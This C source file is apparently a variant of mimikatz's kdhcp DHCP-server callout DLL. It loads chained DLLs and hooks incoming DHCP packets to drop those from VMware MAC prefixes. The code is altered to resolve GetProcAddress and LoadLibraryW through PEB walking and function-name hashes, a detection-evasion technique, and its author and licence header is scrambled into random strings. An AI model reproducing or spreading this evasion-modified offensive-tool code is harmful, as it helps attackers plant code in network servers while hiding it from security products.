/*	HEstebqu SqUtI `PQu4nQbtjF`
	https://blog.PQu4nQbtjF.com
	isMW9TRNNJyHATgICHfOUxr
	Licence : https://GHViJ8cQzKiJugP.org/licenses/by/4.0/
*/
#include "kdhcp.h"
#include "..\mimilib\api_resolver.h"

HMODULE kdhcp_nextLibrary = NULL;
LPDHCP_NEWPKT kdhcp_nextLibraryCalloutNewPkt = NULL;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	if((ul_reason_for_call == DLL_PROCESS_DETACH) && kdhcp_nextLibrary)
		FreeLibrary(kdhcp_nextLibrary);
	return TRUE;
}

//DWORD CALLBACK kdhcp_DhcpServerCalloutEntry(IN LPWSTR ChainDlls, IN DWORD CalloutVersion, IN OUT LPDHCP_CALLOUT_TABLE CalloutTbl)
//{
//	LPDHCP_ENTRY_POINT_FUNC nextEntry;
//	RtlZeroMemory(CalloutTbl, sizeof(DHCP_CALLOUT_TABLE));
//	PDWORD functionAddress = getFunctionAddressByHash((char*)"kernel32", 0x003db390f);
//	customGetProcAddress GetProcAddress_ = (customGetProcAddress)functionAddress;
//
//	if(ChainDlls)
//		if(kdhcp_nextLibrary = LoadLibrary(ChainDlls))
//			//if(nextEntry = (LPDHCP_ENTRY_POINT_FUNC) GetProcAddress(kdhcp_nextLibrary, DHCP_CALLOUT_ENTRY_POINT))
//			if (nextEntry = (LPDHCP_ENTRY_POINT_FUNC)GetProcAddress_(kdhcp_nextLibrary, DHCP_CALLOUT_ENTRY_POINT))
//				nextEntry(ChainDlls + lstrlenW(ChainDlls) + 1, CalloutVersion, CalloutTbl);
//
//	if(CalloutTbl->DhcpNewPktHook)
//		kdhcp_nextLibraryCalloutNewPkt = CalloutTbl->DhcpNewPktHook;
//	CalloutTbl->DhcpNewPktHook = kdhcp_DhcpNewPktHook;
//
//	return ERROR_SUCCESS;
//}

DWORD CALLBACK kdhcp_DhcpServerCalloutEntry(IN LPWSTR ChainDlls, IN DWORD CalloutVersion, IN OUT LPDHCP_CALLOUT_TABLE CalloutTbl) 
{
	LPDHCP_ENTRY_POINT_FUNC nextEntry;
	RtlZeroMemory(CalloutTbl, sizeof(DHCP_CALLOUT_TABLE));


	//HMODULE hKernel = GetModuleHandleA("kernel32.dll");
	HMODULE hKernel32Base = GetModuleBaseFromPEB(L"kernel32.dll");
	//FARPROC funcAddr = getFunctionByHash(hKernel, 0x003db390f);
	FARPROC funcAddr = getFunctionByHash(hKernel32Base, H_GetProcAddress);
	customGetProcAddress GetProcAddress_ = (customGetProcAddress)funcAddr;

	FARPROC fpLoadLib = getFunctionByHash(hKernel32Base, H_LoadLibraryW);
	customLoadLibraryW LoadLibraryW_ = (customLoadLibraryW)fpLoadLib;

	if (ChainDlls) {
		//if (kdhcp_nextLibrary = LoadLibrary(ChainDlls)) {
		if (kdhcp_nextLibrary = LoadLibraryW_(ChainDlls)) {
			if (nextEntry = (LPDHCP_ENTRY_POINT_FUNC)
				GetProcAddress_(kdhcp_nextLibrary, DHCP_CALLOUT_ENTRY_POINT))
			{
				nextEntry(ChainDlls + lstrlenW(ChainDlls) + 1, CalloutVersion, CalloutTbl);
			}
		}
	}

	if (CalloutTbl->DhcpNewPktHook)
		kdhcp_nextLibraryCalloutNewPkt = CalloutTbl->DhcpNewPktHook;
	CalloutTbl->DhcpNewPktHook = kdhcp_DhcpNewPktHook;

	return ERROR_SUCCESS;
}

const BYTE macToBlack[][MAC_ADDRESS_SIZE] = {
	{0x00, 0x0c, 0x29, 0x00, 0x00, 0x00},
	{0x00, 0x50, 0x56, 0x00, 0x00, 0x00}
};
DWORD CALLBACK kdhcp_DhcpNewPktHook(IN OUT LPBYTE *Packet, IN OUT DWORD *PacketSize, IN DWORD IpAddress, IN LPVOID Reserved, IN OUT LPVOID *PktContext, OUT LPBOOL ProcessIt)
{
	DWORD status = ERROR_SUCCESS, m;
	*ProcessIt = TRUE;

	for(m = 0; m < ARRAYSIZE(macToBlack); m++)
	{
		if(RtlEqualMemory(*Packet + MAC_SOURCE_ADDRESS_OFFSET, macToBlack[m], MAC_ADDRESS_SIZE / 2)) // just the start of the address
		{
			*ProcessIt = FALSE;
			status = DHCP_DROP_INVALID;
			break;
		}
	}
	if(kdhcp_nextLibraryCalloutNewPkt && *ProcessIt)
		status = kdhcp_nextLibraryCalloutNewPkt(Packet, PacketSize, IpAddress, Reserved, PktContext, ProcessIt);
	return status;
}